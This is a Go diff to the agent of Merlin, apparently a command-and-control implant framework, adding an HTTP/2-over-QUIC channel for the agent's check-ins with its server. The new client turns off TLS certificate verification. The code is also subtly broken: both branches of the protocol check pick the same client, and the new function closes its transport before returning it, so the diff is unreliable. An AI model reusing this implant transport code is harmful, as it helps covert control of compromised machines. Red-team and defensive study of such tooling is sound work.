@@ -41,6 +41,8 @@ import (
 	"github.com/fatih/color"
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
+	"github.com/lucas-clemente/quic-go"
+	"github.com/lucas-clemente/quic-go/h2quic"
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg"
@@ -50,7 +52,7 @@ import (
 
 // GLOBAL VARIABLES
 var mRun = true
-var h2Client = getH2WebClient()
+//var h2Client = getHQWebClient() //TODO move this to init()?
 var agentShell = ""
 var build = "nonRelease"
 var initial = false
@@ -78,6 +80,7 @@ type Agent struct {
 	Skew		  int64
 	Verbose		  bool
 	Debug 		  bool
+	Proto 		  string
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -151,7 +154,7 @@ func New(verbose bool, debug bool) Agent {
 }
 
 // Run instructs an agent to establish communications with the passed in server using the passed in protocol
-func (a *Agent) Run(server string, proto string) {
+func (a *Agent) Run(server string, proto string) { // TODO move this proto to the agent struct
 	rand.Seed(time.Now().UTC().UnixNano())
 
 	if a.Verbose {
@@ -159,16 +162,25 @@ func (a *Agent) Run(server string, proto string) {
 		message("note", fmt.Sprintf("Agent build: %s", build))
 	}
 
+	// Setup the client the agent will use to communicate with the server
+	// TODO Move this to the New() function ?
+	client := &http.Client{}
+	if proto == "hq"{
+		client = getHQWebClient()
+	} else {
+		client = getHQWebClient()
+	}
+
 	for mRun {
 		if initial {
 			if a.Verbose {
 				message("note","Checking in")
 			}
-			a.statusCheckIn(server, h2Client)
+			a.statusCheckIn(server, client)
 		} else {
-			initial = a.initialCheckIn(server, h2Client)
+			initial = a.initialCheckIn(server, client)
 			if initial {
-				a.agentInfo(server, h2Client)
+				a.agentInfo(server, client)
 			}
 		}
 		if a.FailedCheckin >= a.MaxRetry {
@@ -573,6 +585,7 @@ func (a *Agent) statusCheckIn(host string, client *http.Client) {
 	}
 }
 
+// getH2WebClient returns a HTTP/2 client for making HTTP requests
 func getH2WebClient() *http.Client {
 
 	// Setup TLS Configuration
@@ -593,6 +606,32 @@ func getH2WebClient() *http.Client {
 	// Setup HTTP Client Configuration
 	client := &http.Client{
 		Transport: tr,
+	}
+	return client
+}
+
+// getHQWebClient returns a HTTP/2 over QUIC client for making HTTP requests
+func getHQWebClient() *http.Client {
+
+	// Setup TLS Configuration
+	roundTripper := &h2quic.RoundTripper{
+		QuicConfig: &quic.Config{Versions: []quic.VersionNumber{quic.VersionGQUIC39}, IdleTimeout: 0},
+		TLSClientConfig: &tls.Config {
+			MinVersion:               tls.VersionTLS12,
+			InsecureSkipVerify:       true,
+			PreferServerCipherSuites: false,
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
+			},
+			NextProtos: []string{"hq"},
+		},
+	}
+	defer roundTripper.Close()
+
+	// Setup HTTP Client Configuration
+	client := &http.Client{
+		Transport: roundTripper,
 	}
 	return client
 }
